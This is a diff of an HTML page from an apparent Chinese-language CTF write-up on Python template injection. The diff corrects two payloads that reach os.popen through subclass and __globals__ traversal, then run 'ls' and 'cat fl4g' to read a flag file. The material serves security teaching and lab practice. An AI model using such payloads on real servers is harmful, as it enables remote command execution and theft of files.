@@ -458,13 +458,13 @@ __globals__  对包含函数全局变量的字典的引用</code></pre><h3 id="c
 <p><img src="/img/ssti_subclasses.png" alt=""></p>
 <p>我们现在就是要去寻找可以执行命令或者读取文件的类，由于类的数量太多，可以考虑使用脚本来进行判断。这里找的是site._Printer类，是第72个类(所以索引应该是71)</p>
 <p><img src="/img/ssti_subclasses_71.png" alt=""></p>
-<h3 id="查看读取文件"><a href="#查看读取文件" class="headerlink" title="查看读取文件"></a>查看读取文件</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;ls&#39;).read()</code></p>
+<h3 id="查看读取文件"><a href="#查看读取文件" class="headerlink" title="查看读取文件"></a>查看读取文件</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
 <p>我们可以利用<code>.__init__.__globals__</code>来查找os类下的，<code>__init__</code>初始化类，<code>__globals__</code>全局查找所有的方法、变量、参数。</p>
 <p>在我们全局查找所有的方法时，找到一个可以利用的function popen（这里我利用的是os模块中的popen执行ls来打印所有文件，还有其他很多方法来读取文件，详情可以自行百度）</p>
 <p>发现我们要找的flag文件</p>
 <p><img src="/img/ssti_ls.png" alt=""></p>
 <p>将ls命令换成cat命令，即可读取到文件内容</p>
-<p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;cat fl4g&#39;).read()</code></p>
+<p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read()</code></p>
 <p><img src="/img/ssti_cat.png" alt=""></p>
 <p>该题还有其他的payload，原理都一样。</p>
 <p>参考文章:<a href="https://www.xav1er.top/index.php/archives/20/" target="_blank" rel="noopener">https://www.xav1er.top/index.php/archives/20/</a></p>
